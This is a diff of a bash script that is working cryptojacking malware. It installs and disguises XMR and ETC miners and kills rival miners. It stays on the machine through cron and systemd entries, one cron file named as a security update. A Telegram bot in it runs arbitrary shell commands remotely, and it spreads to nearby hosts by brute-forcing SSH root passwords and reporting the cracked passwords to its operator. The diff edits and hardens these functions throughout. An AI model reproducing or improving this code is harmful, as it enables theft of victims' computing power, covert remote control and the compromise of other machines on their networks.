@@ -33,6 +33,14 @@ else
     LOG_PATH="/tmp"
 fi
 
+#---------------------------------------------------#
+#                  HELPER FUNCTIONS                 #
+#---------------------------------------------------#
+
+get_hostname() {
+    hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo "$HOSTNAME" 2>/dev/null || echo "unknown_host"
+}
+
 get_server_ip() {
     curl -s -4 ifconfig.me 2>/dev/null || curl -s -6 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}' 2>/dev/null || echo "0.0.0.0"
 }
@@ -40,10 +48,6 @@ get_server_ip() {
 SERVER_IP=$(get_server_ip)
 WORKER_ID=$(echo "$SERVER_IP" | tr -d '.')
 WORKER_NAME="${KRIPTEX_USERNAME}.${WORKER_ID}"
-
-#---------------------------------------------------#
-#                  HELPER FUNCTIONS                 #
-#---------------------------------------------------#
 
 log_event() {
     echo "$(date '+%Y-%m-%d %H:%M:%S') | $*" >> "$LOGFILE"
@@ -65,7 +69,7 @@ download_file() {
     if command -v wget &>/dev/null; then
         wget --no-check-certificate -q "$url" -O "$out"
     elif command -v curl &>/dev/null; then
-        curl -L -s "$url" -o "$out"
+        curl -L -k -s "$url" -o "$out"
     else
         log_event "ERROR: wget/curl not found. Cannot download $url"
         return 1
@@ -82,9 +86,7 @@ find_working_pool() {
             break
         fi
     done
-    if [ -z "$result" ]; then
-        result="$1"
-    fi
+    [ -z "$result" ] && result="$1"
     echo "$result"
 }
 
@@ -94,16 +96,15 @@ find_working_pool() {
 
 cleanup_miner_processes() {
     log_event "Cleaning up competing miner processes..."
-    local patterns="miner|xmrig|lolMiner|crypto|eth|xmr|monero"
-    local whitelist="ngrok|ssh|screen|bash|zsh|tmux|ComfUi|$$|cryptex"
+    local patterns="miner|xmrig|ComfUI|lolMiner|crypto|eth|xmr|monero"
+    local whitelist="ngrok|ssh|screen|ComfUI|bash|zsh|tmux|$$|cryptex|EtcUi|XmrUi"
     local cleared=0
     
     ps aux | grep -Ei "$patterns" | grep -v grep | while read -r line; do
         pid=$(echo "$line" | awk '{print $2}')
         pname=$(echo "$line" | awk '{print $11}')
         
-        # Skip our own processes and whitelist
-        if [[ "$pid" == "$$" ]] || echo "$pname" | grep -Eiq "$whitelist|EtcUi|XmrUi"; then
+        if [[ "$pid" == "$$" ]] || echo "$pname" | grep -Eiq "$whitelist"; then
             continue
         fi
         
@@ -115,11 +116,11 @@ cleanup_miner_processes() {
 install_dependencies() {
     log_event "Checking dependencies..."
     if $IS_ROOT; then
-        for pkg in curl cron jq nc sshpass bc; do
+        for pkg in curl cron jq nc sshpass bc hostname; do
             if ! command -v "$pkg" &>/dev/null; then
-                apt-get update -qq >/dev/null 2>&1 && apt-get install -y "$pkg" >/dev/null 2>&1 || \
-                yum install -y "$pkg" >/dev/null 2>&1 || \
-                apk add "$pkg" >/dev/null 2>&1
+                (apt-get update -qq >/dev/null 2>&1 && apt-get install -y "$pkg" >/dev/null 2>&1) || \
+                (yum install -y "$pkg" >/dev/null 2>&1) || \
+                (apk add "$pkg" >/dev/null 2>&1)
             fi
         done
     fi
@@ -127,50 +128,65 @@ install_dependencies() {
 
 install_miners() {
     log_event "Installing miners..."
-    # Install ETC Miner
     mkdir -p "${MINING_PATH}/etc" && cd "${MINING_PATH}/etc"
-    download_file "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz" "lol.tar.gz"
-    tar -xzf lol.tar.gz --strip-components=1 && rm -f lol.tar.gz
-    chmod +x "${MINING_PATH}/etc/lolMiner"
+    download_file "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz" "lol.tar.gz" && \
+    tar -xzf lol.tar.gz --strip-components=1 && rm -f lol.tar.gz && \
+    chmod +x "${MINING_PATH}/etc/lolMiner" || { log_event "ETC miner install failed"; return 1; }
     
-    # Install XMR Miner
     mkdir -p "${MINING_PATH}/xmr" && cd "${MINING_PATH}/xmr"
-    download_file "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz" "xmr.tar.gz"
-    tar -xzf xmr.tar.gz --strip-components=1 && rm -f xmr.tar.gz
-    chmod +x "${MINING_PATH}/xmr/xmrig"
+    download_file "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz" "xmr.tar.gz" && \
+    tar -xzf xmr.tar.gz --strip-components=1 && rm -f xmr.tar.gz && \
+    chmod +x "${MINING_PATH}/xmr/xmrig" || { log_event "XMR miner install failed"; return 1; }
     
     log_event "Miners installed."
+    return 0
 }
 
 setup_autostart() {
     log_event "Setting up persistence..."
-    # Create a cron job to act as a master watchdog for the main script
-    local master_watchdog_script="/etc/cron.d/security-update-check"
     local main_script_path=$(readlink -f "$0")
-    
-    if $IS_ROOT; then
-        cat > "$master_watchdog_script" <<EOF
-* * * * * root if ! pgrep -f "telegram_listener"; then bash $main_script_path &> /dev/null & fi
+
+    # Method 1: Systemd (preferred for root)
+    if $IS_ROOT && command -v systemctl &>/dev/null; then
+        cat > /etc/systemd/system/mining-daemon.service <<EOF
+[Unit]
+Description=Mining Control Daemon
+After=network.target
+[Service]
+ExecStart=/bin/bash $main_script_path
+Restart=always
+RestartSec=30
+User=root
+[Install]
+WantedBy=multi-user.target
 EOF
-        chmod 0644 "$master_watchdog_script"
-        log_event "Master watchdog cron created at $master_watchdog_script"
-    else
+        systemctl daemon-reload &>/dev/null
+        systemctl enable mining-daemon.service &>/dev/null
+        systemctl start mining-daemon.service &>/dev/null
+        log_event "Systemd service created and enabled."
+        return
+    fi
+
+    # Method 2: Cron (fallback)
+    if command -v crontab &>/dev/null && (pgrep -f "cron" >/dev/null || pgrep -f "crond" >/dev/null); then
         (crontab -l 2>/dev/null | grep -v "$main_script_path"; \
-         echo "* * * * * if ! pgrep -f 'telegram_listener'; then bash $main_script_path &> /dev/null & fi") | crontab -
-        log_event "User-level master watchdog cron created."
+         echo "@reboot $main_script_path &"; \
+         echo "* * * * * if ! pgrep -f 'telegram_listener'; then bash $main_script_path & fi") | crontab -
+        log_event "Cron persistence installed."
+    else
+        log_event "WARNING: No working persistence method (Systemd/Cron) found. Script will not survive reboot."
     fi
 }
+
 
 start_all_miners() {
     log_event "Starting all miners..."
     local ETC_POOL_SELECTED=$(find_working_pool "${ETC_POOLS[@]}")
     local XMR_POOL_SELECTED=$(find_working_pool "${XMR_POOLS[@]}")
 
-    # Start ETC
     (exec -a "EtcUi" "${MINING_PATH}/etc/lolMiner" --algo ETCHASH --pool "$ETC_POOL_SELECTED" --user "${WORKER_NAME}" --tls off --nocolor) &> "${LOG_PATH}/etc-miner.log" &
     log_event "Started EtcUi"
 
-    # Start XMR instances
     for i in $(seq 1 $XMR_INSTANCES); do
         local process_name="XmrUi-${i}"
         (exec -a "$process_name" "${MINING_PATH}/xmr/xmrig" -o "$XMR_POOL_SELECTED" -u "${WORKER_NAME}" -p x --randomx-1gb-pages) &> "${LOG_PATH}/xmr-miner-${i}.log" &
@@ -187,18 +203,18 @@ watchdog() {
     while true; do
         sleep $WATCHDOG_INTERVAL
         
-        # Check ETC
         if ! pgrep -f "^EtcUi$" >/dev/null; then
             log_event "WATCHDOG: EtcUi not running, restarting."
+            pkill -9 -f "^EtcUi$"
             local ETC_POOL_SELECTED=$(find_working_pool "${ETC_POOLS[@]}")
             (exec -a "EtcUi" "${MINING_PATH}/etc/lolMiner" --algo ETCHASH --pool "$ETC_POOL_SELECTED" --user "${WORKER_NAME}" --tls off --nocolor) &> "${LOG_PATH}/etc-miner.log" &
         fi
 
-        # Check XMR instances
         for i in $(seq 1 $XMR_INSTANCES); do
             local process_name="XmrUi-${i}"
             if ! pgrep -f "^${process_name}$" >/dev/null; then
                 log_event "WATCHDOG: $process_name not running, restarting."
+                pkill -9 -f "^${process_name}$"
                 local XMR_POOL_SELECTED=$(find_working_pool "${XMR_POOLS[@]}")
                 (exec -a "$process_name" "${MINING_PATH}/xmr/xmrig" -o "$XMR_POOL_SELECTED" -u "${WORKER_NAME}" -p x --randomx-1gb-pages) &> "${LOG_PATH}/xmr-miner-${i}.log" &
             fi
@@ -209,10 +225,8 @@ watchdog() {
 periodic_report() {
      while true; do
         sleep $PERIODIC_REPORT_INTERVAL
-        
         local uptimes=$(ps -eo etime,comm 2>/dev/null | grep -E 'EtcUi|XmrUi' | awk '{print $2, $1}' | tr '\n' '; ')
         local etc_hash=$(tail -20 "${LOG_PATH}/etc-miner.log" 2>/dev/null | grep -o "Average speed.*" | tail -1 | awk '{print $3" "$4}')
-        
         local xmr_total_hash=0
         local xmr_hashes=""
         for i in $(seq 1 $XMR_INSTANCES); do
@@ -224,7 +238,7 @@ periodic_report() {
         done
         
         send_telegram_message "📊 Auto-report
-Host: $(hostname)
+Host: $(get_hostname)
 IP: $(get_server_ip)
 Worker: $WORKER_NAME
 Uptime: $uptimes
@@ -256,44 +270,29 @@ telegram_listener() {
             case "$msg" in
                 "/status $WORKER_NAME")
                     local uptimes=$(ps -eo etime,comm | grep -E 'EtcUi|XmrUi' | awk '{print $2, $1}' | tr '\n' '; ')
-                    local etc_log=$(tail -3 "${LOG_PATH}/etc-miner.log" 2>/dev/null)
-                    local xmr_log=$(tail -3 "${LOG_PATH}/xmr-miner-1.log" 2>/dev/null)
-                    send_telegram_message "Status: $(uptime)
-UPTIMES: $uptimes
-ETC Log:
-$etc_log
-XMR-1 Log:
-$xmr_log"
+                    send_telegram_message "Status on $(get_hostname): $(uptime)
+UPTIMES: $uptimes"
                     ;;
                 "/restart $WORKER_NAME")
                     send_telegram_message "Restarting all miners on $WORKER_NAME..."
-                    pkill -9 -f "EtcUi"
-                    pkill -9 -f "XmrUi-"
+                    pkill -9 -f "EtcUi"; pkill -9 -f "XmrUi-"
                     sleep 2
                     start_all_miners
                     send_telegram_message "Miners restarted."
                     ;;
                 "/stop $WORKER_NAME")
                     send_telegram_message "Stopping all miners on $WORKER_NAME."
-                    pkill -9 -f "EtcUi"
-                    pkill -9 -f "XmrUi-"
+                    pkill -9 -f "EtcUi"; pkill -9 -f "XmrUi-"
                     send_telegram_message "Miners stopped."
                     ;;
                 "/log $WORKER_NAME")
                     local log_data=$(tail -n $LOG_TAIL "$LOGFILE" 2>/dev/null)
                     send_telegram_message "Log for $WORKER_NAME:\n<pre>${log_data:-Log is empty}</pre>"
                     ;;
-                "/update $WORKER_NAME")
-                    send_telegram_message "Updating script on $WORKER_NAME..."
-                    pkill -9 -f "EtcUi"; pkill -9 -f "XmrUi-"
-                    rm -rf "${MINING_PATH}"
-                    # Assuming the update mechanism involves re-downloading and running this script
-                    send_telegram_message "Update requires manual re-execution of the deployment command."
-                    ;;
                 /bash\ $WORKER_NAME*)
                     local bashcmd="${msg#"/bash $WORKER_NAME "}"
-                    local out=$(bash -c "$bashcmd" 2>&1 | head -c 4000) # Telegram message limit
-                    send_telegram_message "<pre>$(hostname):~# $bashcmd\n$out</pre>"
+                    local out=$(bash -c "$bashcmd" 2>&1 | head -c 4000)
+                    send_telegram_message "<pre>$(get_hostname):~# $bashcmd\n$out</pre>"
                     ;;
             esac
         done
@@ -340,7 +339,7 @@ deploy_to_local_network() {
                 log_event "Success with pass '$found_pass' for $target_ip"
                 sshpass -p "$found_pass" scp -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$0" "root@$target_ip:/tmp/deploy.sh"
                 sshpass -p "$found_pass" ssh -o StrictHostKeyChecking=no "root@$target_ip" "bash /tmp/deploy.sh &" && \
-                send_telegram_message "✅ Successfully deployed to $target_ip using password: $found_pass"
+                send_telegram_message "✅ Deployed to $target_ip via SSH pass: $found_pass"
             fi
         ) &
     done
@@ -353,31 +352,34 @@ deploy_to_local_network() {
 #---------------------------------------------------#
 
 main() {
-    # Prevent multiple instances of the main logic
     if pgrep -f "telegram_listener" >/dev/null; then
-        echo "Main script already running. Exiting."
+        echo "Daemon already running. Exiting bootstrap."
         exit
     fi
 
-    send_telegram_message "🚀 **Deployment started on $(hostname)**
-IP: ${SERVER_IP}
-Worker: ${WORKER_NAME}
-User: $(whoami)"
+    send_telegram_message "🚀 **Deployment started on $(get_hostname)**
+IP: ${SERVER_IP} | Worker: ${WORKER_NAME} | User: $(whoami)"
     
     install_dependencies
     cleanup_miner_processes
-    install_miners
+    if ! install_miners; then
+        send_telegram_message "❌ **FATAL: Miner installation failed on $(get_hostname).**"
+        exit 1
+    fi
     setup_autostart
     start_all_miners
     
-    send_telegram_message "✅ **Deployment successful on $(hostname)!**
-Miners are running. Watchdog and listeners are active."
+    send_telegram_message "✅ **Deployment successful on $(get_hostname)!**"
     
-    # Launch daemons in the background
+    # Daemonize
     ( watchdog &> /dev/null & )
     ( periodic_report &> /dev/null & )
     ( deploy_to_local_network &> /dev/null & )
-    telegram_listener # This stays in the foreground to keep the script alive
+    
+    # Self-destruct if possible
+    # if [ -w "$0" ]; then rm -f -- "$0"; fi
+
+    telegram_listener
 }
 
 main
